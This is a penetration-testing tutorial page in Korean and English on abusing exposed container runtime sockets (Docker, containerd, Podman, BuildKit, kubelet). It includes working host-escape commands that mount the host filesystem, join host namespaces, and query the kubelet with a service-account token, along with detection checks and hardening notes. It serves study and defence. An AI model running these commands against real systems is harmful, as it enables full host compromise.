# Runtime API And Daemon Exposure

{{#include ../../../banners/hacktricks-training.md}}

## Overview

많은 실제 container 침해는 namespace escape로 시작되지 않습니다. 대신 runtime control plane에 대한 접근으로 시작합니다. workload가 마운트된 Unix socket이나 노출된 TCP listener를 통해 `dockerd`, `containerd`, CRI-O, Podman, 또는 kubelet과 통신할 수 있다면, attacker는 더 높은 privileges를 가진 새 container를 요청하거나, host filesystem을 mount하거나, host namespaces에 join하거나, 민감한 node 정보를 가져올 수 있습니다. 이런 경우 runtime API가 실제 security boundary이며, 이를 compromise하는 것은 기능적으로 host를 compromise하는 것과 거의 같습니다.

이것이 runtime socket exposure를 kernel protections와 별도로 문서화해야 하는 이유입니다. 일반적인 seccomp, capabilities, 그리고 MAC confinement를 가진 container도 `/var/run/docker.sock` 또는 `/run/containerd/containerd.sock`가 내부에 mount되어 있으면 host compromise로 가는 API call 하나 앞에 있을 수 있습니다. 현재 container의 kernel isolation은 설계대로 정확히 동작하고 있을 수 있지만, runtime management plane은 여전히 완전히 exposed 상태일 수 있습니다.

## Daemon Access Models

Docker Engine은 전통적으로 `unix:///var/run/docker.sock`의 local Unix socket을 통해 privileged API를 노출합니다. 과거에는 `tcp://0.0.0.0:2375` 같은 TCP listener나 `2376`의 TLS-protected listener를 통해 remote로도 노출되었습니다. 강력한 TLS와 client authentication 없이 daemon을 remote로 노출하는 것은 사실상 Docker API를 remote root interface로 바꾸는 것과 같습니다.

containerd, CRI-O, Podman, 그리고 kubelet도 유사한 high-impact surface를 노출합니다. 이름과 workflow는 다르지만 논리는 같습니다. interface가 caller에게 workload 생성, host paths mount, credentials retrieve, 또는 running containers 변경을 허용한다면, 그 interface는 privileged management channel이며 그에 맞게 다뤄야 합니다.

확인해볼 만한 common local paths는:
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```
더 오래되었거나 더 특수한 stack은 `dockershim.sock`, `frakti.sock`, 또는 `rktlet.sock` 같은 endpoints를 노출할 수도 있습니다. 이런 것들은 현대 환경에서는 덜 흔하지만, 발견되면 ordinary application sockets가 아니라 runtime-control surfaces를 의미하므로 같은 수준의 주의로 다뤄야 합니다.

## Secure Remote Access

daemon을 local socket 밖으로 노출해야 한다면, connection은 TLS로 보호되어야 하며, 가능하면 mutual authentication을 사용해 daemon이 client를 확인하고 client도 daemon을 확인하도록 해야 합니다. 편의를 위해 Docker daemon을 plain HTTP로 열어두는 오래된 습관은 container administration에서 가장 위험한 실수 중 하나인데, 그 이유는 API surface가 바로 privileged containers를 만들 수 있을 만큼 강력하기 때문입니다.

historical Docker configuration pattern은 다음과 같았습니다:
```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```
systemd 기반 호스트에서는 daemon 통신이 `fd://`로도 나타날 수 있는데, 이는 process가 systemd로부터 미리 열린 socket을 상속받고 직접 바인딩하는 대신 이를 사용한다는 뜻이다. 중요한 점은 정확한 syntax가 아니라 security consequence다. daemon이 엄격하게 권한이 제한된 local socket을 넘어 리슨하는 순간, transport security와 client authentication은 선택적 hardening이 아니라 필수가 된다.

## Abuse

runtime socket이 존재한다면, 어떤 socket인지, 호환되는 client가 있는지, 그리고 raw HTTP 또는 gRPC access가 가능한지 확인하라:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
podman --url unix:///run/podman/podman.sock info 2>/dev/null
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io ps 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///run/containerd/containerd.sock ps 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers 2>/dev/null
```
이 명령들은 dead path, 마운트되어 있지만 접근할 수 없는 socket, 그리고 살아 있는 privileged API를 구분해 주기 때문에 유용하다. client가 성공하면 다음 질문은 API가 host bind mount나 host namespace sharing을 사용해 새 container를 실행할 수 있는지 여부다.

### When No Client Is Installed

`docker`, `podman`, 또는 다른 친숙한 CLI가 없다고 해서 socket이 안전하다는 뜻은 아니다. Docker Engine은 Unix socket 위에서 HTTP를 사용하고, Podman은 `podman system service`를 통해 Docker-compatible API와 Libpod-native API를 모두 노출한다. 즉, `curl`만 있는 최소 환경에서도 daemon을 구동할 수 있을 만큼 충분할 수 있다:
```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock http://localhost/v1.54/images/json
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"Image":"ubuntu:24.04","Cmd":["id"],"HostConfig":{"Binds":["/:/host"]}}' \
-X POST http://localhost/v1.54/containers/create

curl --unix-socket /run/podman/podman.sock http://d/_ping
curl --unix-socket /run/podman/podman.sock http://d/v1.40.0/images/json
```
이것은 post-exploitation 동안 중요합니다. 왜냐하면 defenders가 종종 일반적인 client binaries는 제거하지만 management socket은 마운트된 상태로 남겨두기 때문입니다. Podman hosts에서는 rootful과 rootless deployments에서 high-value path가 다르다는 점을 기억하세요: rootful service instances의 경우 `unix:///run/podman/podman.sock`, rootless ones의 경우 `unix://$XDG_RUNTIME_DIR/podman/podman.sock`입니다.

### Full Example: Docker Socket To Host Root

`docker.sock`에 접근할 수 있다면, 고전적인 escape 방법은 host root filesystem을 마운트하는 새 container를 시작한 다음 그 안으로 `chroot`하는 것입니다:
```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```
이는 Docker daemon을 통해 host-root 실행을 직접 제공합니다. 영향은 파일 읽기에만 국한되지 않습니다. 새 container 안에 들어가면, 공격자는 host 파일을 수정하고, credentials를 수집하고, persistence를 심거나, 추가 privileged workloads를 시작할 수 있습니다.

### Full Example: Docker Socket To Host Namespaces

공격자가 filesystem-only access 대신 namespace 진입을 선호한다면:
```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```
이 경로는 현재 컨테이너를 악용하는 대신, runtime에 명시적으로 host-namespace 노출이 있는 새 container를 생성하도록 요청해서 host에 도달한다.

### Full Example: containerd Socket

마운트된 `containerd` socket도 보통 그만큼 위험하다:
```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```
더 Docker-like한 client가 있으면, `nerdctl`은 `ctr`보다 더 편리할 수 있는데, `--privileged`, `--pid=host`, `-v` 같은 익숙한 flags를 제공하기 때문이다:
```bash
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io run --rm -it \
--privileged --pid=host -v /:/host docker.io/library/alpine:latest sh
chroot /host /bin/sh
```
영향은 다시 host compromise입니다. Docker 전용 tooling이 없어도, 다른 runtime API가 여전히 같은 관리 권한을 제공할 수 있습니다. Kubernetes 노드에서는 `crictl`도 CRI endpoint에 직접 통신하므로 reconnaissance와 container interaction에 충분할 수 있습니다.

### BuildKit Socket

`buildkitd`는 사람들이 종종 "그냥 build backend" 정도로 생각해서 쉽게 놓치지만, 이 daemon도 여전히 privileged control plane입니다. 접근 가능한 `buildkitd.sock`는 attacker가 arbitrary build steps를 실행하고, worker capabilities를 inspect하며, compromised environment의 local contexts를 사용하고, daemon이 허용하도록 구성된 경우 `network.host` 또는 `security.insecure` 같은 dangerous entitlements를 요청할 수 있게 합니다.

유용한 첫 interaction은 다음과 같습니다:
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers
buildctl --addr unix:///run/buildkit/buildkitd.sock du
```
daemon이 build 요청을 수락하면, insecure entitlements가 사용 가능한지 테스트하세요:
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock build \
--frontend dockerfile.v0 \
--local context=. \
--local dockerfile=. \
--allow network.host \
--allow security.insecure \
--output type=local,dest=/tmp/buildkit-out
```
정확한 영향은 daemon 설정에 따라 다르지만, permissive entitlements가 있는 rootful BuildKit 서비스는 무해한 개발 편의 기능이 아니다. 특히 CI runner와 공유 build node에서는 이를 또 하나의 고가치 관리 surface로 취급해야 한다.

### Kubelet API Over TCP

kubelet은 container runtime은 아니지만, 여전히 node management plane의 일부이며 종종 같은 trust boundary 논의 안에 놓인다. kubelet secure port `10250`이 workload에서 접근 가능하거나, node credentials, kubeconfigs, 또는 proxy 권한이 노출되면, attacker는 Kubernetes API server admission path를 전혀 거치지 않고도 Pods를 열거하고, logs를 가져오거나, node-local containers에서 commands를 실행할 수 있다.

가벼운 discovery부터 시작하라:
```bash
curl -sk https://127.0.0.1:10250/pods
curl -sk https://127.0.0.1:10250/runningpods/
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://127.0.0.1:10250/pods
```
kubelet 또는 API-server proxy 경로가 `exec`를 authorize한다면, WebSocket-capable client는 이를 node의 다른 containers에서 code execution으로 바꿀 수 있습니다. 이것이 `get` permission만 있는 `nodes/proxy`가 생각보다 더 dangerous한 이유이기도 합니다: request는 여전히 commands를 execute하는 kubelet endpoints에 도달할 수 있고, 이러한 direct kubelet interactions는 일반적인 Kubernetes audit logs에 나타나지 않습니다.

## Checks

이 checks의 목표는 container가 trust boundary 밖에 남아 있어야 했던 management plane에 접근할 수 있는지 여부를 답하는 것입니다.
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE|BUILDKIT_HOST|XDG_RUNTIME_DIR'
find /run /var/run -maxdepth 3 \( -name 'buildkitd.sock' -o -name 'podman.sock' \) 2>/dev/null
```
흥미로운 점은 다음과 같습니다:

- 마운트된 runtime socket은 보통 단순한 정보 유출이 아니라 직접적인 administrative primitive입니다.
- `2375`의 TCP listener에 TLS가 없으면 remote-compromise 상태로 간주해야 합니다.
- `DOCKER_HOST` 같은 environment variables는 workload가 host runtime과 통신하도록 의도적으로 설계되었음을 드러내는 경우가 많습니다.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | 기본적으로 local Unix socket | `dockerd`는 local socket에서 listen 하며 daemon은 보통 rootful입니다 | `/var/run/docker.sock` 마운트, `tcp://...:2375` 노출, `2376`에서 weak 또는 missing TLS |
| Podman | 기본적으로 daemonless CLI | 일반적인 local use에는 long-lived privileged daemon이 필요하지 않으며; `podman system service`가 활성화되면 API sockets가 여전히 노출될 수 있습니다 | `podman.sock` 노출, 서비스를 광범위하게 실행, rootful API 사용 |
| containerd | local privileged socket | administrative API는 local socket을 통해 노출되며 보통 higher-level tooling이 이를 사용합니다 | `containerd.sock` 마운트, 광범위한 `ctr` 또는 `nerdctl` 접근, privileged namespaces 노출 |
| CRI-O | local privileged socket | CRI endpoint는 node-local trusted components용으로 설계되었습니다 | `crio.sock` 마운트, CRI endpoint를 untrusted workloads에 노출 |
| Kubernetes kubelet | node-local management API | Kubelet은 Pods에서 광범위하게 reachable하면 안 됩니다; authn/authz에 따라 pod state, credentials, execution features가 노출될 수 있습니다 | kubelet sockets 또는 certs 마운트, weak kubelet auth, host networking과 reachable kubelet endpoint |

## References

- [containerd socket exploitation part 1](https://thegreycorner.com/2025/02/12/containerd-socket-exploitation-part-1.html)
- [Kubernetes API Server Bypass Risks](https://kubernetes.io/docs/concepts/security/api-server-bypass-risks/)
{{#include ../../../banners/hacktricks-training.md}}
